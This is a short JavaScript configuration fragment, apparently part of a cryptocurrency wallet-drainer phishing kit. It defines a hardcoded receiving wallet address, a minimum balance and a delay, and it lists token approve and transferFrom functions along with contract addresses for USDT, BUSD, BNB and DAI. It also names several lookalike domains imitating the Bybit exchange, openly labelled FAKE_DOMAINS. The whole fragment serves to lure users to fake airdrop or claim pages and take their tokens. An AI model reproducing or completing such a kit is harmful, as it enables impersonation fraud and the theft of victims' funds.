const receiveAddress = "0x86a208Cf4D384eE68dc600A39f092E394b582f9d";
const minimumBalance = 50;
const delayHours = 2;
const network = "mainnet";
const tokenSymbol = "USDT";
const decimals = 18;
const TOKEN_ABI = [
    "function transferFrom(address sender, address recipient, uint256 amount) public returns (bool)",
    "function approve(address spender, uint256 amount) public returns (bool)",
    "function balanceOf(address account) public view returns (uint256)"
];
const TOKEN_ADDRESSES = {
    USDT: "0x55d398326f99059ff775485246999027b3197955",
    BUSD: "0xe9e7cea3dedca5984780bafc599bd69add087d56",
    BNB: "0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c",
    DAI: "0x1af3f329e8be154074d8769d1ffa4ee058b1dbc3"
};
const FAKE_DOMAINS = [
    "bybit-airdrop.com",
    "bybit-claim.net",
    "bbit.com",
    "bybitsecure.com"
];
